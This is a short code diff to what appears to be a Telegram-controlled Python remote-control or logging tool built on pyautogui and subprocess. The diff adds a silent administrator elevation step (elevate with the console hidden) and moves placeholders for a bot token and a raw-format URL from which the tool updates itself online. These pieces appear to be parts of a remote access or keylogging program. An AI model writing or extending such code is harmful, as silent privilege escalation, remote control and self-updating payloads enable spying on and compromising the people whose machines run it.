@@ -14,6 +14,21 @@ import pyautogui
 from subprocess import call
 from telegram import ForceReply, Update
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
+from elevate import elevate
+from win32com.shell import shell
+
+if shell.IsUserAnAdmin():
+    print()
+else:
+    elevate(show_console=False)
+
+
+file=sys.argv[0] 
+#Token for the telegram bot.
+token="your token here in string format"
+#url for online update source
+url="your github version of this code here, or wherever your storing your code. Just make sure it's in raw format"
+
 
 
 
@@ -66,14 +81,8 @@ class logger:
 
 
 
-__version__=1.02
+__version__=1.04
 
-
-file=sys.argv[0] 
-#Token for the telegram bot.
-token="your token here in string format"
-#url for online update source
-url="your github version of this code here, or wherever your storing your code. Just make sure it's in raw format"
 
 
 
